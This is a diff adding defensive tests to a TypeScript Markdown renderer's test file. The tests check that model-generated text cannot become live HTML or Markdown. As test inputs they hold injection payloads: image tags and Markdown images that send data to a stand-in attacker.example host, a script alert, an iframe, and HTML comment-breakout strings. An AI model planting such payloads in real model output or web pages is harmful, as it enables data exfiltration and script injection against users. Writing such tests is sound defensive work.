@@ -434,3 +434,78 @@ describe("markdownEnhancedRenderer", () => {
     expect(decoded).toContain("# Should we enter the German market?");
   });
 });
+
+// ---------------------------------------------------------------------------
+// Model text is data in the Markdown output (OWASP LLM05)
+// ---------------------------------------------------------------------------
+
+describe("renderMarkdownEnhanced — model text cannot become markup", () => {
+  /** A brief and its first section, which every test below edits. */
+  function briefAndFirstSection() {
+    const brief = makeBrief();
+    const [first] = brief.synthesis.sections;
+    const [finding] = brief.research.findings;
+    if (first === undefined || finding === undefined) throw new Error("makeBrief has a section and a finding");
+    return { brief, first, finding };
+  }
+
+  test("raw HTML in a section, a claim or a title is written inert", () => {
+    const { brief, first, finding } = briefAndFirstSection();
+    first.content_markdown = 'Margins held. <img src="https://attacker.example/b?d=1">';
+    first.title = "Intro <script>alert(1)</script>";
+    finding.claim = "c1 <iframe src=https://attacker.example>";
+    const md = renderMarkdownEnhanced(brief, { include_appendices: true });
+    expect(md).not.toMatch(/<(img|script|iframe)/);
+    expect(md).toContain('Margins held. &lt;img src="https://attacker.example/b?d=1">');
+  });
+
+  test("an image in a claim or a critique is not an image", () => {
+    const { brief, finding } = briefAndFirstSection();
+    finding.claim = "c1 ![x](https://attacker.example/b.png?d=1)";
+    const critiqued = makeBriefWithCritique();
+    const [critique] = critiqued.adversarial.critiques;
+    if (critique === undefined) throw new Error("makeBriefWithCritique has a critique");
+    critique.suggested_revision = "![y](https://attacker.example/c.png)";
+    const md = renderMarkdownEnhanced(brief, { include_appendices: true });
+    const mdCritique = renderMarkdownEnhanced(critiqued, { include_critique: true });
+    expect(md).not.toContain("![x]");
+    expect(mdCritique).not.toContain("![y]");
+  });
+
+  test("the question keeps its characters in the front matter", () => {
+    const md = renderMarkdownEnhanced(makeBrief({ question: "Is X < Y?" }));
+    expect(md).toContain('question: "Is X < Y?"');
+  });
+
+  test("a validation issue cannot close the comment it is written in", () => {
+    const { brief, first } = briefAndFirstSection();
+    first.validation_issues = ["fine --> # Injected heading"];
+    const md = renderMarkdownEnhanced(brief);
+    const comment = md.slice(md.indexOf("<!-- Validation issues:"));
+    expect(comment.indexOf("-->")).toBe(comment.indexOf("\n-->") + 1);
+  });
+
+  test("a validation issue cannot close its comment with --!> either", () => {
+    // HTML ends a comment at `--!>` as well as `-->` (CodeQL js/bad-tag-filter).
+    const { brief, first } = briefAndFirstSection();
+    first.validation_issues = ["fine --!> <img src=x>"];
+    const md = renderMarkdownEnhanced(brief);
+    const comment = md.slice(md.indexOf("<!-- Validation issues:"));
+    expect(comment).not.toContain("--!>");
+  });
+
+  test("a source title ending in a backslash cannot escape its closing bracket", () => {
+    const { brief, first } = briefAndFirstSection();
+    first.sources_cited = [{ ...SRC_A, title: "Annual report \\" }];
+    const md = renderMarkdownEnhanced(brief);
+    expect(md).toContain(`[Annual report \\\\](${SRC_A.url})`);
+  });
+
+  test("a URL with parentheses or spaces stays one link target", () => {
+    const { brief, first } = briefAndFirstSection();
+    const source = { ...SRC_A, url: "https://example.org/wiki/Foo_(bar) x" };
+    first.sources_cited = [source];
+    const md = renderMarkdownEnhanced(brief);
+    expect(md).toContain("[Reuters article A](https://example.org/wiki/Foo_%28bar%29%20x)");
+  });
+});
